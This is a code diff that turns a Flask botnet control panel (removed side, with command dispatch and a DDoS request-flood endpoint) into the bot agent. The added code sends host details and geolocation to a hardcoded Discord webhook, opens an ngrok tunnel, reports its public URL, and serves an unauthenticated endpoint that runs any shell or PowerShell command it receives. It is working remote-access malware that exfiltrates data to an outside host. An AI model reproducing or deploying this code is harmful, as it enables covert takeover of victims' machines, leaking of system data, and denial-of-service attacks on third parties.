@@ -1,162 +1,125 @@
-from flask import Flask, render_template, request, jsonify
-import requests
+from flask import Flask, request, jsonify
+import json
+import socket
 import os
-import signal
+import platform
+import requests
+import subprocess
 import time
+from dhooks import Webhook
+import signal
+import sys
 
 app = Flask(__name__)
 
-# Global variables
-ngrok_urls = []
-bot_username = "Unknown_user"  # Assign your bot's username here
+if platform.system() == 'Linux':
+    os.system("clear")
+else:
+    os.system("cls")
 
-# Function to get the username of a worker
-def get_username(url):
-    endpoint = f"{url}/get_username"
+username = "silenthawk69"
+hook_url = "https://discord.com/api/webhooks/1283829399132573798/BQYGDwoOEfz7_PC1eSzmqO8BmkbAZwm0RmRgAXTC7Uisq3E4u2w5CMSaxkiF3Jeh0fBM"
+hook = Webhook(hook_url)
+
+current_directory = os.getcwd()
+
+def start_ngrok():
+    ngrok_process = subprocess.Popen(['ngrok', 'http', '8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    hook.send("```Waiting for ngrok to start...```")
+    time.sleep(10)
+
     try:
-        response = requests.get(endpoint)
-        response.raise_for_status()
-        username = response.json().get('username', 'Unknown User')
-        return username
-    except requests.exceptions.RequestException as e:
-        print(f"Failed to get username from {url}. Error: {e}")
-        return None
+        response = requests.get('http://localhost:4040/api/tunnels')
+        tunnels = response.json().get('tunnels', [])
+        if tunnels:
+            public_url = tunnels[0]['public_url']
+            hook.send(f"```json\n{public_url}\n```")
+            return public_url, ngrok_process
+        else:
+            hook.send("No tunnels found.")
+            ngrok_process.terminate()
+            return None, ngrok_process
+    except Exception as e:
+        hook.send(f"Error retrieving public URL: {e}")
+        ngrok_process.terminate()
+        return None, ngrok_process
 
-# Function to send command to a worker
-def send_command_to_worker(ngrok_url, command):
-    endpoint = f"{ngrok_url}/execute"
-    try:
-        response = requests.post(endpoint, json={'command': command})
-        response.raise_for_status()  
-        return response.json().get('result', 'No result received')
-    except requests.exceptions.RequestException as e:
-        return f"Failed to send command to {ngrok_url}. Error: {e}"
+def gather_system_info():
+    response = requests.get("http://ip-api.com/json/?fields=61439")
+    ip_data = response.json()
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
 
-# Function to launch requests
-def launch_requests(url, duration):
-    end_time = time.time() + duration
-    responses = []
+    public_ip = ip_data.get('query', 'N/A')
     
-    while time.time() < end_time:
-        for ngrok_url in ngrok_urls:
-            try:
-                response = requests.get(url)  # Send a GET request to the target URL
-                responses.append(f"Response from {ngrok_url}: {response.status_code}")
-            except Exception as e:
-                responses.append(f"Failed to send request to {ngrok_url}: {e}")
+    system_data = platform.uname()
+    system_info = {
+        "Node": system_data.node,
+        "System": system_data.system,
+        "Machine": system_data.machine,
+        "Release": system_data.release,
+        "Version": system_data.version,
+        "Local IP": local_ip
+    }
     
-    return responses
+    hook.send(f"```json\n{json.dumps(system_info, indent=4)}\n```")
+    hook.send(f"```json\n{json.dumps(ip_data, indent=4)}\n```")
+    return public_ip, ip_data, system_info
 
-# Home page
-@app.route('/')
-def index():
-    return render_template('index.html')
-@app.route('/map')
-def map():
-    return render_template('map.html')
+gather_system_info()
+ngrok_url, ngrok_process = start_ngrok()
+time.sleep(5)
 
-
-# Endpoint to set ngrok URLs
-@app.route('/set_ngrok', methods=['POST'])
-def set_ngrok():
-    global ngrok_urls
-    ngrok_urls = request.form['ngrok_urls'].split(',')
-    ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace
-    return jsonify(message="ngrok URLs updated successfully.")
-
-# Endpoint to send command
-@app.route('/send_command', methods=['POST'])
-def send_command():
-    global bot_username
-    command = request.form['command']
-    results = []
-
-    if command.lower().startswith("req "):
-        try:
-            parts = command.split()  # Split the command into parts
-            target_url = parts[1]    # Extract the target URL
-            duration = int(parts[2])  # Extract the duration in seconds
-            
-            # Launch requests to the target URL for the specified duration
-            responses = launch_requests(target_url, duration)
-            results.extend(responses)
-        except (IndexError, ValueError):
-            return jsonify(results=["Invalid command format. Use: req <URL> <DURATION>"]), 400
-
-    elif command.lower() == "update_username":
-        for ngrok_url in ngrok_urls:
-            current_username = get_username(ngrok_url)
-            if current_username:
-                bot_username = current_username  # Update the bot's username
-                result = update_username(ngrok_url, bot_username)
-                results.append(f"Response from {ngrok_url}: {result}")
-                
-    elif command.lower() == "update_coordinates":
-        for ngrok_url in ngrok_urls:
-            coordinates = get_coordinates(ngrok_url)
-            
-            
-
-    else:
-        for ngrok_url in ngrok_urls:
-            result = send_command_to_worker(ngrok_url, command)
-            results.append(f"Response from {ngrok_url}: {result}")
-
-    return jsonify(results=results)
-
-# Launch attack endpoint
-@app.route('/launch_attack', methods=['POST'])
-def launch_attack():
-    data = request.json
-    url = data.get('url')
-    duration = data.get('duration')
-
-    # Here you would implement the logic to launch the attack.
-    # Simulating an attack by sending GET requests to the target URL.
-    end_time = time.time() + int(duration)
-
-    while time.time() < end_time:
-        try:
-            requests.get(url)  # Replace with your attack logic
-        except Exception as e:
-            print(f"Failed to send request to {url}: {e}")
-
-    return jsonify(message="Attack launched"), 200
-
-@app.route('/DDOS')
-def ddos_page():
-    return render_template('ddos.html')
-
-@app.route('/status')
-def status_page():
-    return render_template('status.html')
-
-
-# Route for the bots page
-@app.route('/bots')
-def bots():
-    # Create a dictionary mapping each ngrok URL to its username
-    bots = {url: get_username(url) for url in ngrok_urls}
-    return render_template('bots.html', bots=bots)  # Pass the bots dictionary to the template
-
-# Endpoint to remove a URL
-@app.route('/remove_url', methods=['POST'])
-def remove_url():
-    global ngrok_urls
+@app.route('/execute', methods=['POST'])
+def execute_command():
     data = request.get_json()
-    url_to_remove = data.get('url')
+    command = data.get('command', '')
 
-    if url_to_remove in ngrok_urls:
-        ngrok_urls.remove(url_to_remove)  # Remove the URL from the list
-        return jsonify(message="URL removed successfully."), 200
-    else:
-        return jsonify(message="URL not found."), 404
+    global current_directory
 
-@app.route('/shutdown', methods=['POST'])
-def shutdown():
-    signal.signal(signal.SIGINT, signal.SIG_DFL)  # Allow the program to be killed
-    os.kill(os.getpid(), signal.SIGINT)
-    return jsonify(message="Shutting down the server.")
+    try:
+        if command.lower().startswith("cd "):
+            new_dir = command.split(" ", 1)[1]
+            try:
+                os.chdir(new_dir)
+                current_directory = os.getcwd()
+                return jsonify({'result': f"Changed directory to {current_directory}"})
+            except FileNotFoundError:
+                return jsonify({'error': f"No such file or directory: '{new_dir}'"}), 404
+            except PermissionError:
+                return jsonify({'error': f"Permission denied: '{new_dir}'"}), 403
+
+        if platform.system() == 'Windows':
+            result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True, cwd=current_directory)
+        else:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=current_directory)
+        
+        output = result.stdout if result.returncode == 0 else result.stderr
+        return jsonify({'result': output})
+    
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/update_username', methods=['POST'])
+def update_username():
+    global username
+    new_username = request.json.get('username')
+    if new_username:
+        username = new_username
+        return jsonify({"message": "Username updated", "new_username": username}), 200
+    return jsonify({"message": "Username not provided"}), 400
+
+@app.route('/get_username', methods=['GET'])
+def get_username():
+    return jsonify({"username": username}), 200
+
+def cleanup(signum, frame):
+    hook.send(f"```{username} is offline.```")
+    ngrok_process.terminate()
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, cleanup)
+signal.signal(signal.SIGTERM, cleanup)
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run(host='0.0.0.0', port=8080)
